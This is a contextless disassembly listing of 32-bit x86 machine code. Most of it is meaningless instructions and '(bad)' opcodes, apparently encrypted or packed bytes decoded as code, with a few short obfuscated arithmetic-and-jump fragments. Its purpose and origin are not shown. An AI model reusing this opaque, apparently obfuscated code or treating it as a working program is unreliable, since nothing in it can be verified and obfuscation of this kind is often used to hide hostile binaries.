  405201:	je     0x40518c
  405203:	call   0xd80e850f
  405208:	xchg   esp,eax
  405209:	gs enter 0xeb22,0x10
  40520e:	fwait
  40520f:	loop   0x4051d5
  405211:	sahf   
  405212:	out    dx,eax
  405213:	pop    esi
  405214:	retf   
  405215:	sub    esp,0x14a50eb8
  40521b:	retf   0x12ef
  40521e:	repnz sub ecx,DWORD PTR [esi]
  405221:	dec    ebp
  405222:	in     al,0xe8
  405224:	shl    BYTE PTR [edi-0x18],0xb6
  405228:	ss lahf 
  40522a:	xor    esi,DWORD PTR [ecx]
  40522c:	cdq    
  40522d:	or     al,0xe8
  40522f:	fstp   TBYTE PTR [ebx-0x7122f992]
  405235:	mov    ebx,0x2be00c55
  40523a:	scas   eax,DWORD PTR es:[edi]
  40523b:	ins    BYTE PTR es:[edi],dx
  40523c:	jno    0x40524f
  40523e:	loopne 0x405232
  405240:	stos   DWORD PTR es:[edi],eax
  405241:	jnp    0x405278
  405243:	mov    al,ds:0x10e3b589
  405248:	xor    BYTE PTR [ecx],0x6b
  40524b:	dec    BYTE PTR [esi+0x3c05e155]
  405251:	daa    
  405252:	push   cs
  405253:	jnp    0x4052c7
  405255:	jno    0x4052a9
  405257:	inc    ebp
  405258:	imul   ebx,edx,0x39
  40525b:	jle    0x4052a9
  40525d:	in     al,dx
  40525e:	mov    eax,0xf02601f1
  405263:	push   0x41a6ac25
  405268:	shl    DWORD PTR [ecx],cl
  40526a:	xor    ch,BYTE PTR [esi+0x546cfd87]
  405270:	mov    ds:0xb859abfa,al
  405275:	fsubr  st,st(4)
  405277:	push   cs
  405278:	pop    esi
  405279:	mov    edi,0xd20bf4ed
  40527e:	cli    
  40527f:	pop    ebp
  405280:	ret    0x8623
  405283:	cs in  eax,0xdb
  405286:	fmul   st(6),st
  405288:	or     ecx,eax
  40528a:	adc    al,bh
  40528c:	jp     0x40530b
  40528e:	mov    bl,0x87
  405290:	cmp    al,0x9d
  405292:	push   ds
  405293:	out    0x35,al
  405295:	cmp    ah,dh
  405297:	push   0x13b86ea4
  40529c:	leave  
  40529d:	pop    edx
  40529e:	pop    eax
  40529f:	and    al,ch
  4052a1:	lds    ecx,FWORD PTR [ecx+0x30]
  4052a4:	fst    DWORD PTR [edx]
  4052a6:	push   es
  4052a7:	push   es
  4052a8:	(bad)  
  4052a9:	es in  eax,dx
  4052ab:	mov    ebp,0xa077f337
  4052b0:	jb     0x4052c1
  4052b2:	mov    cl,0xf8
  4052b4:	pop    es
  4052b5:	and    al,0x9
  4052b7:	sar    ebx,0xe
  4052ba:	mov    eax,0xe4f58495
  4052bf:	mov    ds:0x2bb952a9,eax
  4052c4:	sbb    al,0xff
  4052c6:	fadd   st(4),st
  4052c8:	mov    ds:0xa39e8e98,eax
  4052cd:	ja     0x4052fa
  4052cf:	or     al,0xc2
  4052d1:	dec    ecx
  4052d2:	fadd   QWORD PTR [ecx+0x63363106]
  4052d8:	mov    DWORD PTR [edi],0x88ae9ec9
  4052de:	loope  0x40531d
  4052e0:	popa   
  4052e1:	adc    eax,0x856f08b7
  4052e6:	xor    al,0xed
  4052e8:	mov    dl,0x15
  4052ea:	or     eax,0x29601fac
  4052ef:	dec    edx
  4052f0:	arpl   WORD PTR [ebx+0xfbb5817],sp
  4052f6:	gs (bad) 
  4052f8:	repnz lahf 
  4052fa:	jl     0x4052f9
  4052fc:	inc    ebp
  4052fd:	retf   
  4052fe:	adc    DWORD PTR [edi+eax*2],edx
  405301:	cmp    al,0x21
  405304:	out    dx,eax
  405305:	xor    BYTE PTR [ecx+0x29],dh
  405308:	or     cl,BYTE PTR [esp+ebp*2]
  40530b:	loope  0x40532f
  40530d:	push   edi
  40530e:	pop    eax
  40530f:	arpl   WORD PTR [ebx+eiz*1+0x9],si
  405313:	frstor [edi-0x5d]
  405316:	stos   BYTE PTR es:[edi],al
  405317:	push   ecx
  405318:	jnp    0x4052ff
  40531a:	(bad)  
  40531b:	repz lock fbstp TBYTE PTR [eax]
  40531f:	iret   
  405320:	sub    dl,BYTE PTR [edx-0x4f]
  405323:	data16 jnp 0x4052ec
  405326:	lahf   
  405327:	mov    ecx,0xe6bf5ed2
  40532c:	pop    ebp
  40532d:	pop    eax
  40532e:	out    dx,al
  40532f:	ret    0x4bc5
  405332:	push   eax
  405333:	or     BYTE PTR ds:0xce155936,cl
  405339:	and    eax,DWORD PTR [ecx+0x281d195f]
  40533f:	gs dec edx
  405341:	push   0xffffffa3
  405343:	pop    ebx
  405344:	int    0xc0
  405346:	inc    dh
  405348:	pop    edi
  405349:	mov    edx,0x42b72ff2
  40534e:	push   ds
  40534f:	mov    al,0x9a
  405351:	bound  ebx,QWORD PTR [ecx]
  405353:	retf   0x44eb
  405356:	daa    
  405357:	data16 cmp al,0x0
  40535a:	int    0x69
  40535c:	cmp    ecx,esi
  40535e:	mov    esi,DWORD PTR [edx+ebp*1-0x4faa8f4b]
  405365:	add    BYTE PTR [esi-0x6b],dl
  405368:	adc    eax,0x2786bce9
  40536d:	std    
  40536e:	push   es
  40536f:	pop    esi
  405370:	out    dx,al
  405371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405372:	or     eax,0xa9c5fb6f
  405377:	mov    edi,DWORD PTR [edx]
  405379:	test   eax,0x586279f1
  40537e:	and    BYTE PTR [bx-0x72f8],ah
  405383:	daa    
  405384:	shr    BYTE PTR [ecx+0x1e],0x2b
  405388:	pop    ecx
  405389:	bound  edi,QWORD PTR [ebx]
  40538b:	xchg   esi,eax
  40538c:	mov    eax,ds:0x362fc3cd
  405391:	pop    edi
  405392:	push   cs
  405393:	xor    DWORD PTR [edi+0x7f],esp
  405396:	push   ecx
  405397:	jns    0x405411
  405399:	adc    ch,dl
  40539b:	int3   
  40539c:	jle    0x40539f
  40539e:	mov    esi,0x75b2707c
  4053a3:	add    BYTE PTR [esi+0x1d],cl
  4053a6:	jne    0x405401
  4053a8:	pop    edx
  4053a9:	jbe    0x405397
  4053ab:	ret    0x23e8
  4053ae:	push   ebx
  4053af:	mov    al,0x10
  4053b1:	shl    ebx,cl
  4053b3:	sbb    ebx,esp
  4053b5:	push   esp
  4053b6:	frstor [esp+ecx*4-0x6]
  4053ba:	and    BYTE PTR [edx-0x37e10163],dh
  4053c0:	ret    0x9070
  4053c3:	dec    eax
  4053c4:	add    DWORD PTR ss:[esi-0x38],ebx
  4053c8:	lds    ebp,FWORD PTR [ebx-0xb]
  4053cb:	pusha  
  4053cc:	adc    al,0xbd
  4053ce:	lds    eax,FWORD PTR [edi+0x7e33ffd2]
  4053d4:	cmp    DWORD PTR [edx-0x63253520],eax
  4053da:	jne    0x405448
  4053dc:	inc    eax
  4053dd:	sbb    dl,ah
  4053df:	imul   ebx,DWORD PTR [edi+0x315136bd],0xffffffa6
  4053e6:	push   ebx
  4053e7:	and    BYTE PTR [esi-0x4a],0x22
  4053eb:	or     ah,cl
  4053ed:	dec    edx
  4053ee:	jle    0x4053b8
  4053f0:	push   cs
  4053f1:	mov    WORD PTR [edx-0x5],gs
  4053f4:	jns    0x4053b8
  4053f6:	and    ecx,edi
  4053f8:	sub    ebx,edx
  4053fa:	lods   al,BYTE PTR ds:[esi]
  4053fb:	cdq    
  4053fc:	adc    eax,0x100f4944
  405401:	test   ecx,edi
  405403:	mov    ebp,0x6381df9a
  405408:	push   eax
  405409:	mov    WORD PTR [edx],gs
  40540b:	rol    BYTE PTR [esp+edx*8+0x5cf38d7e],cl
  405412:	xor    ah,BYTE PTR [esi]
  405414:	(bad)  
  405415:	jne    0x4053e9
  405417:	cli    
  405418:	dec    edx
  405419:	push   edx
  40541a:	jne    0x405417
  40541c:	pop    esp
  40541d:	push   es
  40541e:	stos   DWORD PTR es:[edi],eax
  40541f:	cwde   
  405420:	xchg   DWORD PTR [esi],ecx
  405422:	dec    esi
  405423:	popf   
  405424:	pop    eax
  405425:	push   ecx
  405426:	lahf   
  405427:	xor    BYTE PTR [edi+0x721e0e1b],cl
  40542d:	or     al,0xb4
  40542f:	xor    eax,0x5fec5507
  405434:	mov    ebx,0xfc4ba24b
  405439:	jle    0x405421
  40543b:	mov    eax,ds:0x80e3fcb4
  405440:	test   DWORD PTR [ecx+ebx*2+0x39091d8a],esp
  405447:	mov    edx,0xa3922238
  40544c:	push   ebx
  40544d:	xchg   ecx,eax
  40544e:	sbb    DWORD PTR ss:[esi+0x11],ebx
  405452:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405453:	jmp    0xfb7a2f32
  405458:	or     ah,BYTE PTR ds:0x40c2a137
  40545e:	push   0x5a900a61
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi-0x261d0448]
  405484:	sbb    eax,0x7e2bd012
  405489:	jle    0x4054e3
  40548b:	jl     0x40550b
  40548d:	jle    0x405410
  40548f:	xchg   DWORD PTR [edx+0x65c3ecda],esi
  405495:	sub    bh,BYTE PTR [edi+0x61]
  405498:	jno    0x405501
  40549a:	xchg   esp,eax
  40549b:	sub    eax,0x3e5ccc38
  4054a0:	jne    0x405430
  4054a2:	ret    
  4054a3:	ficomp DWORD PTR [edi+0x79]
  4054a6:	ja     0x4054db
  4054a8:	dec    eax
  4054a9:	sub    eax,0x1b0a0157
  4054ae:	jae    0x4054fd
  4054b0:	div    BYTE PTR [ebx+0x17b913ba]
  4054b6:	cmp    bh,BYTE PTR [eax]
  4054b8:	xchg   esp,eax
  4054b9:	jp     0x4054d6
  4054bb:	pushf  
  4054bc:	(bad)  
  4054bd:	xor    ebp,DWORD PTR [ebx]
  4054bf:	mov    edi,0x9abb0638
  4054c4:	and    ah,bl
  4054c6:	push   ebp
  4054c7:	push   ebp
  4054c8:	dec    ecx
  4054c9:	inc    esp
  4054ca:	mov    esp,0x4d34f3f3
  4054cf:	mov    eax,ds:0x105709e2
  4054d4:	mov    WORD PTR [edx-0x4c524d36],ds
  4054da:	add    al,0xc7
  4054dc:	sbb    al,BYTE PTR [ecx+0x6e]
  4054df:	cs jae 0x4054d9
  4054e2:	int3   
  4054e3:	lea    ebp,[ecx+0x2e0d719d]
  4054e9:	adc    eax,0xb78287e6
  4054ee:	nop
  4054ef:	add    BYTE PTR [di],0x55
  4054f3:	fwait
  4054f4:	push   ecx
  4054f5:	sbb    DWORD PTR [esi+eiz*4-0x62],esp
  4054f9:	ins    DWORD PTR es:[edi],dx
  4054fa:	loop   0x405512
  4054fc:	xor    BYTE PTR [ebp+0x34],ah
  4054ff:	mov    esp,DWORD PTR [edx-0x34ee4dcd]
  405505:	adc    ecx,ebx
  405507:	ins    DWORD PTR es:[edi],dx
  405508:	push   ecx
  405509:	stc    
  40550a:	jne    0x405576
  40550c:	mov    dl,cl
  40550e:	or     BYTE PTR [edi+edx*8-0x4],ch
  405512:	dec    esi
  405513:	(bad)  
  405515:	pop    ss
  405516:	or     edi,DWORD PTR ds:0xfa12f190
  40551c:	fsubr  st,st(7)
  40551e:	ins    DWORD PTR es:[edi],dx
  40551f:	(bad)
  405522:	ins    BYTE PTR es:[edi],dx
  405523:	and    eax,0x7a48d668
  405528:	or     BYTE PTR [esi-0x17292212],dh
  40552e:	cld    
  40552f:	in     eax,0xbb
  405531:	mov    ebx,0xb5303fda
  405536:	aaa    
  405537:	add    DWORD PTR [eax+0x56],esp
  40553a:	pop    ecx
  40553b:	mov    edi,0xf483b5cb
  405540:	inc    ebp
  405541:	inc    esp
  405542:	inc    eax
  405543:	push   cs
  405544:	cmp    al,0xd9
  405546:	or     cl,BYTE PTR [ecx-0x6c0205e8]
  40554c:	inc    eax
  40554d:	jge    0x405555
  40554f:	dec    ebp
  405550:	fcomi  st,st(3)
  405552:	and    ch,BYTE PTR [edi-0x1f530644]
  405558:	in     eax,0x1d
  40555a:	jmp    0x405595
  40555c:	dec    ebp
  40555d:	push   edi
  40555e:	push   ebp
  40555f:	fwait
  405560:	pushf  
  405561:	mov    ecx,0x67cc9701
  405566:	das    
  405567:	mov    edx,0x9b1f91c7
  40556c:	in     al,0xa4
  40556e:	sbb    eax,esi
  405570:	out    dx,eax
  405571:	or     BYTE PTR [edx],al
  405573:	xlat   BYTE PTR ds:[ebx]
  405574:	mov    cl,0x21
  405576:	push   esp
  405577:	xchg   ebp,eax
  405578:	(bad)  
  40557a:	adc    DWORD PTR ds:[edx+ebp*2+0x5f],0xdbbbece5
  405583:	adc    BYTE PTR [edx-0x7d],bh
  405586:	neg    DWORD PTR [eax-0x31e2b555]
  40558c:	and    al,0x7b
  40558e:	sti    
  40558f:	aad    0xc5
  405591:	mov    al,ds:0x7ae6988e
  405596:	repnz (bad) 
  405598:	stc    
  405599:	(bad)  
  40559a:	jle    0x4055f0
  40559c:	xchg   ecx,eax
  40559d:	test   eax,0xd493283f
  4055a2:	mov    ds:0xe61e9154,eax
  4055a7:	mov    bl,0x83
  4055a9:	jbe    0x4055f0
  4055ab:	xlat   BYTE PTR ds:[ebx]
  4055ac:	sub    dh,BYTE PTR [ecx]
  4055ae:	or     BYTE PTR [ecx],dl
  4055b0:	sbb    DWORD PTR [edi+0x15e7dfbb],ebp
  4055b6:	fmul   QWORD PTR [eax+0x17]
  4055b9:	inc    esp
  4055ba:	xchg   edx,eax
  4055bb:	iret   
  4055bc:	jnp    0x40558d
  4055be:	popf   
  4055bf:	iret   
  4055c0:	loop   0x405616
  4055c2:	ins    BYTE PTR es:[edi],dx
  4055c3:	js     0x4055f3
  4055c5:	xchg   esp,eax
  4055c6:	add    DWORD PTR [ebx+0x47db91de],edi
  4055cc:	js     0x4055f5
  4055ce:	pop    ds
  4055cf:	iret   
  4055d0:	cli    
  4055d1:	rcl    BYTE PTR [edx-0x6d],cl
  4055d4:	rcl    DWORD PTR [edx+0x59f29bde],cl
  4055da:	add    eax,0x32b4bcef
  4055df:	mov    ch,BYTE PTR ds:0xeaa882d0
  4055e5:	rcr    eax,0x60
  4055e8:	inc    ebp
  4055e9:	add    al,BYTE PTR [edi]
  4055eb:	fldenv [ebx+0x202d2c07]
  4055f1:	into   
  4055f2:	xor    DWORD PTR [edx-0x4],eax
  4055f5:	(bad)  
  4055f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055f7:	das    
  4055f8:	test   eax,0x5e51ebee
  4055fd:	mov    bh,0xec
  4055ff:	jge    0x40564a
  405601:	jbe    0x405677
  405603:	adc    eax,eax
  405605:	dec    edx
  405606:	push   edx
  405607:	mov    ch,BYTE PTR [edx]
  405609:	test   eax,0xa89603c5
  40560e:	out    dx,al
  40560f:	push   ds
  405610:	data16 xor al,0xa1
  405613:	lea    eax,[ebx-0x2b]
  405616:	add    BYTE PTR [ebp-0x3e],ah
  405619:	pop    ss
  40561a:	push   ss
  40561b:	adc    eax,DWORD PTR [edi+0x25]
  40561e:	jno    0x40565b
  405620:	sub    bl,bl
  405622:	dec    ecx
  405623:	adc    eax,DWORD PTR [ecx-0x76a8f636]
  405629:	jno    0x40563c
  40562b:	inc    esi
  40562c:	add    eax,0xdb5229ec
  405631:	push   ss
  405632:	pop    esi
  405633:	aaa    
  405634:	mov    DWORD PTR [edx-0x16],edx
  405637:	dec    ecx
  405638:	sbb    DWORD PTR [eax],0x26e682fb
  40563e:	cmp    eax,0x7b13f4e0
  405643:	in     al,0x79
  405645:	pop    ebx
  405646:	pop    esi
  405647:	fild   DWORD PTR cs:[ebp-0x2d24a6ef]
  40564e:	cmp    edi,edi
  405650:	or     DWORD PTR [eax-0x5657328d],eax
  405656:	xchg   esp,eax
  405657:	mov    esp,0x9725827a
  40565c:	jp     0x4055e9
  40565e:	push   es
  40565f:	mov    eax,ds:0x5050083
  405664:	mov    ecx,0x7fffde25
  405669:	adc    eax,0x63e145f8
  40566e:	or     edx,DWORD PTR ds:0x3577000c
  405674:	stos   BYTE PTR es:[edi],al
  405675:	xor    BYTE PTR [edi+0x22],ch
  405678:	(bad)  
  405679:	js     0x4056bd
  40567b:	or     esi,DWORD PTR [esi+0x1]
  40567e:	xchg   ax,ax
  405680:	inc    ecx
  405681:	mov    dl,0x87
  405683:	xor    eax,0x95b7c861
  405688:	pop    ebp
  405689:	inc    ebx
  40568a:	imul   eax,DWORD PTR [edi-0x1f],0xffffffec
  40568e:	fst    DWORD PTR [edx+0x56e36f9b]
  405694:	sub    BYTE PTR [esi],bh
  405696:	sub    al,0x22
  405698:	jecxz  0x40567f
  40569a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40569b:	mov    ds:0x197e3432,al
  4056a0:	jg     0x405629
  4056a2:	xor    eax,0xbe7d2b68
  4056a7:	fsubr  QWORD PTR [edx]
  4056a9:	xchg   ebx,eax
  4056aa:	dec    edx
  4056ab:	mov    DWORD PTR [esi],edi
  4056ad:	and    DWORD PTR [ebp-0x64f4f81b],0x832af96e
  4056b7:	push   esp
  4056b8:	stos   BYTE PTR es:[edi],al
  4056b9:	pop    ecx
  4056ba:	mov    BYTE PTR [esp+ebx*2],ch
  4056bd:	popf   
  4056be:	xchg   esi,eax
  4056bf:	sub    DWORD PTR [edx+0x8],ebx
  4056c2:	js     0x405692
  4056c4:	xor    DWORD PTR [esi+0x2aa1215],eax
  4056ca:	stos   BYTE PTR es:[edi],al
  4056cb:	or     DWORD PTR [edi],ebp
  4056cd:	jne    0x40570b
  4056cf:	loopne 0x4056a3
  4056d1:	in     al,dx
  4056d2:	fwait
  4056d3:	mov    ebp,0x9c260ae7
  4056d8:	(bad)  
  4056d9:	scas   eax,DWORD PTR es:[edi]
  4056da:	shl    DWORD PTR [edi+0x25],0x6c
  4056de:	pop    ss
  4056df:	popf   
  4056e0:	(bad)  
  4056e2:	xor    eax,0xb609e4f2
  4056e7:	xlat   BYTE PTR ds:[ebx]
  4056e8:	mov    ecx,0xd09fc18f
  4056ed:	mov    ds:0xa6bb55c7,eax
  4056f2:	mov    dl,0x23
  4056f4:	mov    eax,ds:0x105228e5
  4056f9:	push   cs
  4056fa:	and    eax,0xcb8521cb
  4056ff:	mov    al,0xa3
  405701:	xor    eax,0xb6863d94
  405706:	jmp    0x6832:0x582e11ed
  40570d:	(bad)  
  40570e:	out    dx,eax
  40570f:	fidivr WORD PTR [ebp+0x6]
  405712:	ds jb  0x4056fb
  405715:	in     al,dx
  405716:	jno    0x4056cf
  405718:	ret    
  405719:	ss ds xchg ebp,eax
  40571c:	pop    ds
  40571d:	or     eax,0xe1fa689f
  405722:	adc    DWORD PTR [esi],0xfffffffb
  405725:	mov    ds:0x29e6dd92,al
  40572a:	push   esp
  40572b:	test   BYTE PTR [edx+0x2b815a94],bl
  405731:	dec    edi
  405732:	add    DWORD PTR [edi+ebp*4+0x5f],0x42
  405737:	out    dx,eax
  405738:	aam    0x7e
  40573a:	push   ds
  40573b:	rcl    DWORD PTR [esi-0xe],1
  40573e:	imul   ebp,DWORD PTR [edx-0x1a],0xffffff94
  405742:	test   al,0xfc
  405744:	and    eax,0x8bd1c5d7
  405749:	mov    esp,0xf67e2050
  40574e:	or     DWORD PTR [ebx+ecx*4+0x6b],ebp
  405752:	mov    eax,DWORD PTR [ecx]
  405754:	adc    BYTE PTR [ebx-0x820df7e],dl
  40575a:	pop    es
  40575b:	add    BYTE PTR [edx+0x41e3b241],al
  405761:	xchg   esi,eax
  405762:	sbb    BYTE PTR [edi+0x15422aa2],bl
  405768:	inc    esp
  405769:	sbb    al,0x82
  40576b:	jmp    0xf7282a54
  405770:	shr    DWORD PTR [ebx+0x1],cl
  405773:	adc    esi,DWORD PTR [ebx]
  405775:	rol    BYTE PTR [ebx],1
  405777:	ror    DWORD PTR [edi],1
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43371b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433623,0x433603
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43365f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x3d
  4057f5:	sbb    eax,0x363a2233
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	(bad)  
  405802:	dec    edx
  405803:	(bad)
  405806:	test   BYTE PTR [eax-0x2724a445],0xfc
  40580d:	jg     0x40585c
  40580f:	loope  0x4057f2
  405811:	add    al,0xfd
  405813:	pop    eax
  405814:	push   cs
  405815:	push   edi
  405816:	push   ecx
  405817:	sub    DWORD PTR [ebp+0x126a15b1],ebp
  40581d:	sub    eax,0x2758344d
  405822:	inc    esi
  405823:	imul   esi,DWORD PTR [ecx],0xfbf35557
  405829:	pusha  
  40582a:	ror    edx,cl
  40582c:	mov    ecx,0x9f912241
  405831:	test   DWORD PTR [ebp-0x2b70ccc9],ecx
  405837:	inc    ecx
  405838:	fisub  WORD PTR [ebx-0x78726cd6]
  40583e:	in     al,0xb3
  405840:	mov    bl,0x86
  405842:	dec    ebx
  405843:	cbw    
  405845:	or     bl,BYTE PTR [esi-0x35]
  405848:	ret    
  405849:	pop    es
  40584a:	cmp    edi,eax
  40584c:	and    eax,0xe52779c2
  405851:	and    BYTE PTR [esi+0x1b],bh
  405854:	inc    esp
  405855:	ret    0x63a6
  405858:	push   ebp
  405859:	les    edx,FWORD PTR [ecx-0x58]
  40585c:	mov    cl,0x9f
  40585e:	mov    edx,0x1404902f
  405863:	or     edx,DWORD PTR [eax-0x2f760ba7]
  405869:	ja     0x4058b1
  40586b:	aad    0x1d
  40586d:	jns    0x405860
  40586f:	pop    edx
  405870:	cmp    ah,BYTE PTR [ebp+edx*2+0x77]
  405874:	test   eax,0xd770c701
  405879:	jle    0x405829
  40587b:	ds stc 
  40587d:	test   BYTE PTR [ebp+eax*4-0x29],ah
  405881:	imul   edx,DWORD PTR [edx],0xffffffa0
  405884:	retf   
  405885:	add    bh,dh
  405887:	pop    ebp
  405888:	push   edx
  405889:	ficomp DWORD PTR es:0x5a532450
  405890:	scas   eax,DWORD PTR es:[edi]
  405891:	pop    ecx
  405892:	std    
  405893:	call   0xbf487fb9
  405898:	hlt    
  405899:	(bad)  
  40589a:	mov    DWORD PTR ds:0x90ecb637,esp
  4058a0:	out    0x8b,al
  4058a2:	mov    bl,0x1c
  4058a4:	xchg   esi,eax
  4058a5:	mov    dl,0xb5
  4058a7:	test   al,0xb4
  4058a9:	xchg   edi,edi
  4058ab:	sub    BYTE PTR [esi-0xba00f44],0xbc
  4058b2:	in     eax,dx
  4058b3:	cmp    eax,ebp
  4058b5:	cli    
  4058b6:	pop    ds
  4058b7:	int3   
  4058b8:	push   0xffffffed
  4058ba:	not    dl
  4058bc:	push   eax
  4058bd:	pushf  
  4058be:	jmp    0x4058fd
  4058c0:	add    ch,BYTE PTR [esi+0x58]
  4058c3:	mov    cl,0x53
  4058c5:	enter  0x2cd8,0x2d
  4058c9:	(bad)  
  4058ca:	in     al,dx
  4058cb:	js     0x4058ab
  4058cd:	cdq    
  4058ce:	mov    cl,0x1b
  4058d0:	and    DWORD PTR [ecx],eax
  4058d2:	stos   BYTE PTR es:[edi],al
  4058d3:	or     DWORD PTR ds:0x7b02f541,esp
  4058d9:	fnstcw WORD PTR [ebx+0x32]
  4058dc:	test   eax,0xd1863d3f
  4058e1:	inc    esi
  4058e2:	in     al,0x13
  4058e4:	and    al,0x1e
  4058e6:	mov    edi,0x880ecf0a
  4058eb:	into   
  4058ec:	mov    esp,0xf3814dc6
  4058f1:	pop    ecx
  4058f2:	xchg   ecx,esp
  4058f4:	adc    ebp,eax
  4058f6:	adc    DWORD PTR ds:0x2916514a,ebx
  4058fc:	xor    BYTE PTR [ebp+0x50],cl
  4058ff:	cwde   
  405900:	jno    0x405954
  405902:	lods   eax,DWORD PTR ds:[esi]
  405903:	or     DWORD PTR [edx-0x3f],0xffffffaa
  405907:	or     ebp,DWORD PTR [ebp-0x57]
  40590a:	fidivr WORD PTR [ebx-0x4492d424]
  405910:	pop    ebx
  405911:	mov    al,ds:0xb7b5ded1
  405916:	jb     0x405911
  405918:	xor    al,0xff
  40591a:	test   al,0xd5
  40591c:	sub    al,BYTE PTR [eax+0x4]
  40591f:	dec    edx
  405920:	shl    BYTE PTR [ebx+esi*1-0x7e],1
  405924:	rcr    esp,0x9
  405927:	das    
  405928:	push   ebx
  405929:	sub    eax,0x90e46db9
  40592e:	call   0xd27d:0xdd2ba13c
  405935:	cmp    al,0xcc
  405937:	fcomip st,st(2)
  405939:	outs   dx,BYTE PTR ds:[esi]
  40593a:	ss inc esp
  40593c:	ficomp WORD PTR [ebx+edx*2-0x42ffae03]
  405943:	mov    dh,0x57
  405945:	xor    eax,0x3449b6fe
  40594a:	cmp    al,0x88
  40594c:	sub    ecx,esp
  40594e:	int    0xc7
  405950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405951:	fistp  WORD PTR [edx+0x9]
  405954:	push   ss
  405955:	dec    ebx
  405956:	or     ebx,ecx
  405958:	js     0x405947
  40595a:	lods   eax,DWORD PTR ds:[si]
  40595c:	mov    ds:0x68f21c81,al
  405961:	(bad)  
  405962:	xor    al,0xfe
  405964:	popf   
  405965:	mov    al,ds:0x846b7483
  40596a:	push   ss
  40596b:	mov    al,ds:0xc9667cf0
  405970:	(bad)  
  405971:	mov    esp,0xfd4f9afd
  405976:	jle    0x4059bc
  405978:	adc    ebx,edi
  40597a:	push   ebx
  40597b:	loope  0x4059f2
  40597d:	xchg   ecx,eax
  40597e:	xor    BYTE PTR [edx+0x60],0x58
  405982:	jbe    0x405907
  405984:	mov    ds:0xc6384b01,eax
  405989:	dec    eax
  40598a:	repnz aaa 
  40598c:	mov    dl,0xc6
  40598e:	in     eax,dx
  40598f:	aam    0x72
  405991:	mov    ch,0x7b
  405993:	sbb    eax,0x35656467
  405998:	adc    al,al
  40599a:	dec    esi
  40599b:	or     DWORD PTR [ebp-0x8],ebx
  40599e:	xor    ebx,DWORD PTR [ecx-0x78]
  4059a1:	push   0x23521d16
  4059a6:	xor    bh,BYTE PTR [eax-0x1c]
  4059a9:	mov    cl,al
  4059ab:	scas   eax,DWORD PTR es:[edi]
  4059ac:	nop
  4059ad:	aam    0x55
  4059af:	jbe    0x40593f
  4059b1:	outs   dx,DWORD PTR ds:[esi]
  4059b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059b3:	jl     0x4059c9
  4059b5:	(bad)  
  4059b6:	mov    bh,0x76
  4059b8:	psllw  mm1,QWORD PTR [ebp-0x17dfdd74]
  4059bf:	adc    BYTE PTR [edi],dl
  4059c1:	aas    
  4059c2:	gs pop edx
  4059c4:	mov    DWORD PTR [esi-0x5a],eax
  4059c7:	ss dec edi
  4059c9:	mov    bh,0x1a
  4059cb:	pop    ebx
  4059cc:	sahf   
  4059cd:	call   0xc9b905fe
  4059d2:	push   eax
  4059d3:	jle    0x4059b8
  4059d5:	sbb    eax,0xa6f7964a
  4059da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059db:	push   es
  4059dc:	pushf  
  4059dd:	aam    0x5d
  4059df:	loope  0x405a4e
  4059e1:	out    dx,eax
  4059e2:	add    BYTE PTR [esp+ebx*1-0x282ba847],ah
  4059e9:	inc    ecx
  4059ea:	ret    
  4059eb:	js     0x4059b3
  4059ed:	ja     0x4059ce
  4059ef:	jbe    0x405a2b
  4059f1:	jmp    0x405a36
  4059f3:	ins    BYTE PTR es:[edi],dx
  4059f4:	loop   0x405a6c
  4059f6:	push   edx
  4059f7:	sub    BYTE PTR [edi],bl
  4059f9:	add    DWORD PTR [esi],eax
  4059fb:	xlat   BYTE PTR ds:[ebx]
  4059fc:	jbe    0x405a58
  4059fe:	pop    ds
  4059ff:	loope  0x4059a8
  405a01:	pop    esi
  405a02:	rcl    DWORD PTR [edi+ecx*1-0x41],cl
  405a06:	icebp  
  405a07:	nop
  405a08:	js     0x4059ae
  405a0a:	gs call 0xbc7e5b52
  405a10:	lods   eax,DWORD PTR ds:[esi]
  405a11:	push   esi
  405a12:	je     0x405995
  405a14:	cmp    ebx,DWORD PTR [edi+0x67]
  405a17:	sub    ecx,DWORD PTR [ecx]
  405a19:	(bad)  
